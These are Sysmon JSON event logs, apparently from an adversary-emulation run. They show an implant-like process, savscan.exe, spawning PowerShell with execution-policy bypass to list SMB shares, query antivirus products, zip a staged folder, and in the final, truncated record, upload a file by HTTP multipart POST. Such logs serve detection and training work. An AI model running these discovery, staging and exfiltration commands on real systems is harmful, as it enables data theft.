{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:01.441475"}, "EventRecordID": 19182, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:01.433", "ProcessGuid": "{4e85e66a-5229-5f35-2746-000000004300}", "ProcessId": 18300, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jjn5iob5.ebd.ps1", "CreationUtcTime": "2020-08-13 14:46:01.433"}, "fields": {"time": 1597304761.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:01.461088"}, "EventRecordID": 19183, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:01.437", "ProcessGuid": "{4e85e66a-5229-5f35-2746-000000004300}", "ProcessId": 18300, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gpvg4sm1.hjw.psm1", "CreationUtcTime": "2020-08-13 14:46:01.437"}, "fields": {"time": 1597304761.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:01.540518"}, "EventRecordID": 19184, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:46:01.505", "ProcessGuid": "{4e85e66a-5229-5f35-2746-000000004300}", "ProcessId": 18300, "PipeName": "\\PSHost.132418035613324782.18300.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304761.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:01.937431"}, "EventRecordID": 19185, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:01.936", "ProcessGuid": "{4e85e66a-5229-5f35-2746-000000004300}", "ProcessId": 18300, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304761.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:01.979080"}, "EventRecordID": 19186, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:46:01.970", "ProcessGuid": "{4e85e66a-5229-5f35-2846-000000004300}", "ProcessId": 14096, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"Get-SmbShare | ConvertTo-Json\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304761.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:02.082239"}, "EventRecordID": 19187, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:02.071", "ProcessGuid": "{4e85e66a-5229-5f35-2846-000000004300}", "ProcessId": 14096, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wh5qioya.un3.ps1", "CreationUtcTime": "2020-08-13 14:46:02.071"}, "fields": {"time": 1597304762.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:02.099762"}, "EventRecordID": 19188, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:02.075", "ProcessGuid": "{4e85e66a-5229-5f35-2846-000000004300}", "ProcessId": 14096, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pzaqyizt.fos.psm1", "CreationUtcTime": "2020-08-13 14:46:02.074"}, "fields": {"time": 1597304762.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:02.171051"}, "EventRecordID": 19189, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:46:02.143", "ProcessGuid": "{4e85e66a-5229-5f35-2846-000000004300}", "ProcessId": 14096, "PipeName": "\\PSHost.132418035619704997.14096.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304762.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:03.724058"}, "EventRecordID": 19190, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:03.723", "ProcessGuid": "{4e85e66a-5229-5f35-2846-000000004300}", "ProcessId": 14096, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304763.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:03.767452"}, "EventRecordID": 19191, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:46:03.761", "ProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ProcessId": 2836, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304763.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:03.870525"}, "EventRecordID": 19192, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:03.860", "ProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ProcessId": 2836, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_h0h5jvmm.43o.ps1", "CreationUtcTime": "2020-08-13 14:46:03.859"}, "fields": {"time": 1597304763.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:03.886871"}, "EventRecordID": 19193, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:03.863", "ProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ProcessId": 2836, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_sqrfqs3o.35q.psm1", "CreationUtcTime": "2020-08-13 14:46:03.863"}, "fields": {"time": 1597304763.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:03.962502"}, "EventRecordID": 19194, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:46:03.932", "ProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ProcessId": 2836, "PipeName": "\\PSHost.132418035637613895.2836.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304763.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:04.063116"}, "EventRecordID": 19195, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Note=WMI Querying", "UtcTime": "2020-08-13 14:46:04.045", "ProcessGuid": "{4e85e66a-522c-5f35-2a46-000000004300}", "ProcessId": 10112, "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "WMI Commandline Utility", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "wmic.exe", "CommandLine": "\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=29B7D02A3B5F670B5AF2DAF008810863,SHA256=96BEC668680152DF51EC1DE1D5362C64C2ABA1EDA86F9121F517646F5DEC2B72,IMPHASH=2169BDA7AED3E42F1A59C8141542EC0C", "ParentProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ParentProcessId": 2836, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\""}, "fields": {"time": 1597304764.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:04.230032"}, "EventRecordID": 19196, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:04.229", "ProcessGuid": "{4e85e66a-522b-5f35-2946-000000004300}", "ProcessId": 2836, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304764.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:29.334187"}, "EventRecordID": 19197, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:46:29.328", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"Compress-Archive -Path C:\\Windows\\system32\\staged -DestinationPath C:\\Windows\\system32\\staged.zip -Force;sleep 1; ls C:\\Windows\\system32\\staged.zip | foreach {$_.FullName} | select\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304789.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:29.436087"}, "EventRecordID": 19198, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:29.428", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bf1vnukb.aew.ps1", "CreationUtcTime": "2020-08-13 14:46:29.428"}, "fields": {"time": 1597304789.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:29.466076"}, "EventRecordID": 19199, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:29.437", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_lg3xxroc.4jf.psm1", "CreationUtcTime": "2020-08-13 14:46:29.437"}, "fields": {"time": 1597304789.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:29.523842"}, "EventRecordID": 19200, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:46:29.504", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "PipeName": "\\PSHost.132418035893282259.18324.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304789.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:30.360722"}, "EventRecordID": 19201, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:30.360", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Windows\\System32\\staged.zip", "CreationUtcTime": "2020-08-13 14:46:30.360"}, "fields": {"time": 1597304790.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:31.566868"}, "EventRecordID": 19202, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:46:31.566", "ProcessGuid": "{4e85e66a-5245-5f35-2b46-000000004300}", "ProcessId": 18324, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304791.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:46:57.344166"}, "EventRecordID": 19203, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:46:57.335", "ProcessGuid": "{4e85e66a-5261-5f35-2e46-000000004300}", "ProcessId": 16848, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = '';$filePath = '';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": 